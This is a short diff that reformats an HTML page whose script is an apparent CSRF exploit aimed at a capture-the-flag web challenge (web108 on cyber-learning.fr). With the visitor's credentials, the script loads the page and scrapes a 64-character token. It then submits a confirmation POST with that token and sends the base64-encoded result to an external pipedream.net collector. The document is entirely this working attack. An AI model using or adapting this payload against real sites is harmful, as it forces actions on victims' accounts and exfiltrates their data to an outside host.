@@ -1,3 +1,23 @@
-<html><body><script>
-fetch('https://cyber-learning.fr/cyber-challenge/web/web108/index.php?a=Accueil&jeton=Pfr1PRXGWA',{credentials:'include'}).then(r=>r.text()).then(h=>{t=h.match(/value="([a-f0-9]{64})"/)[1];fetch('https://cyber-learning.fr/cyber-challenge/web/web108/index.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'jeton=Pfr1PRXGWA&a=Accueil&confirmation=1&token='+t}).then(r=>r.text()).then(x=>fetch('https://eod316u9kkhu7o3.m.pipedream.net/?c='+btoa(x)))})
-</script></body></html>
+<html>
+<body>
+<script>
+fetch('https://cyber-learning.fr/cyber-challenge/web/web108/index.php?a=Accueil&jeton=Pfr1PRXGWA', {
+  credentials: 'include'
+})
+.then(r => r.text())
+.then(h => {
+  t = h.match(/value="([a-f0-9]{64})"/)[1];
+  fetch('https://cyber-learning.fr/cyber-challenge/web/web108/index.php', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'jeton=Pfr1PRXGWA&a=Accueil&confirmation=1&token=' + t
+  })
+  .then(r => r.text())
+  .then(x => fetch('https://eod316u9kkhu7o3.m.pipedream.net/?c=' + btoa(x)))
+})
+</script>
+</body>
+</html>
